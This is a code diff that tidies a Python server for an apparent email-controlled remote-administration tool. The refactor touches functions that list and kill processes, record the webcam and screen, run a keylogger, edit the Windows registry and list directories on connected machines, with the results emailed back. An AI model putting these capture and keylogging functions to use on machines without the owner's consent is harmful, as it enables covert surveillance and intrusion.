@@ -1,15 +1,15 @@
+import os
+import re
 from collections import defaultdict
+from queue import Queue
+from random import choices
+from time import sleep
+
+import cv2
+
 from old_handle import app_process_server
 from old_handle import mac_address_server
 from old_handle import shutdown_logout_server
-from queue import Queue
-import cv2
-import os
-from time import sleep
-from random import choices
-import re
-
-# import mail_provider_handle.SMTP_service
 from mail_provider_handle import SMTP_service as sp
 
 BUFSIZ = 4 * 1024
@@ -26,11 +26,8 @@ def is_valid_ip(ip):
     ip_address = "([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])"
     port = "([0-9]|[1-9][0-9]|[1-9][0-9]{2}|[1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])"
     ip_pattern = re.compile(r"^" + ip_address + "\\." + ip_address + "\\." + ip_address + "\\." + ip_address + "\\:" + port + "$")
-    
-    if (ip_pattern.match(ip)):
-        return True
-    
-    return False
+
+    return bool(ip_pattern.match(ip))
 
 def authorize(email, ip):
     if ((email not in auth_dict) or (not auth_dict[email])) and ip in [elem[1] for elem in conn_ip_list]:
@@ -50,7 +47,7 @@ def disconnect(email):
         auth_dict[email] = False
         ip_email_dict[email_ip_dict[email]] = None
         email_ip_dict[email] = None
-        
+
         sp.send_threading(email, "DISC", "OK")
     sp.send_threading(email, "DISC", "NOT AUTH YET")
 
@@ -96,7 +93,7 @@ def list_application(ip_address):
         result = app_process_server._list(conn, "APPLICATION")
         sp.send_threading(ip_email_dict[ip_address], "LIST APP", str(result))
         # print(result)
-    
+
     action_dictionary[ip_address].put(action_message)
 
 def kill_process(ip_address, id):
@@ -116,7 +113,7 @@ def kill_application(ip_address, id):
         result = app_process_server.send_kill(conn, id)
         sp.send_threading(ip_email_dict[ip_address], "KILL APP", str(result))
         # print(result)
-    
+
     action_dictionary[ip_address].put(action_message)
 
 def capture_webcam(ip_address, time=5):
@@ -133,7 +130,7 @@ def capture_webcam(ip_address, time=5):
                 data_to_recv += r
             data_to_recv = data_to_recv[:size_to_recv] # Remove additional bytes
             sp.send_threading(ip_email_dict[ip_address], "WEBCAM", data_to_recv, "file.avi")
-        except:
+        except Exception:
             sp.send_threading(ip_email_dict[ip_address], "WEBCAM", "FAIL")
     action_dictionary[ip_address].put(action_message)
 
@@ -192,20 +189,20 @@ def capture_screen(ip_address, time=0.5): # Not done ! need more fix for multi t
             data_to_recv = data_to_recv[:size_to_recv] # Remove additional bytes
             file_name = screenshots_directory + "/{}.png".format(n)
             print("file_name = ", file_name)
-            open(file_name, "wb").write(data_to_recv)  
+            open(file_name, "wb").write(data_to_recv)
             n += 1
 
-        video_name = create_video(screenshots_directory)   
-        
+        video_name = create_video(screenshots_directory)
+
         files_list = os.listdir(screenshots_directory)
         for file in files_list:
             os.remove(os.path.join(screenshots_directory, file))
-        
+
         file_open = open(video_name, 'rb')
         file_data = file_open.read()
         sp.send_threading(ip_email_dict[ip_address], "LIVESCREEN", file_data, 'file.avi')
         file_open.close()
-        
+
     action_dictionary[ip_address].put(action_message)
 
 
@@ -260,7 +257,7 @@ def keylog(ip_address, time=10):
         conn.sendall(b'HOOK'.ljust(BUFSIZ))
         conn.sendall(b'PRINT'.ljust(BUFSIZ))
 
-        data = conn.recv(BUFSIZ)      
+        data = conn.recv(BUFSIZ)
         sp.send_threading(ip_email_dict[ip_address], "KEYLOG", data.decode('utf8'))
 
     action_dictionary[ip_address].put(action_message)
@@ -276,12 +273,12 @@ def registry_list(ip_address, full_path):
         for _ in range(0, size_to_recv, BUFSIZ):
             r = conn.recv(BUFSIZ)
             data_to_recv += r
-        data_to_recv = data_to_recv[:size_to_recv] 
+        data_to_recv = data_to_recv[:size_to_recv]
         sp.send_threading(ip_email_dict[ip_address], "REGISTRY LIST", data_to_recv.decode('utf8'))
         # print(data_to_recv)
 
     action_dictionary[ip_address].put(action_message)
-        
+
 
 def registry_update(ip_address, absolute_path, value, data_type):
     def action_message(conn):
@@ -292,7 +289,7 @@ def registry_update(ip_address, absolute_path, value, data_type):
         conn.sendall(bytes(value, "utf8"))
         conn.sendall(bytes(" ", "utf8"))
         conn.sendall(bytes(data_type, "utf8"))
-        
+
         ack = conn.recv(BUFSIZ).decode('utf8')
         sp.send_threading(ip_email_dict[ip_address], "REGISTRY UPDATE", ack)
         # print(ack)
@@ -309,8 +306,8 @@ def dir_list(ip_address, path_to_folder):
         for _ in range(0, size_to_recv, BUFSIZ):
             r = conn.recv(BUFSIZ)
             data_to_recv += r
-        
-        data_to_recv = data_to_recv[:size_to_recv] 
+
+        data_to_recv = data_to_recv[:size_to_recv]
         # print(data_to_recv.decode('utf8'))
         sp.send_threading(ip_email_dict[ip_address], "DIR LIST", data_to_recv.decode('utf8'))
 
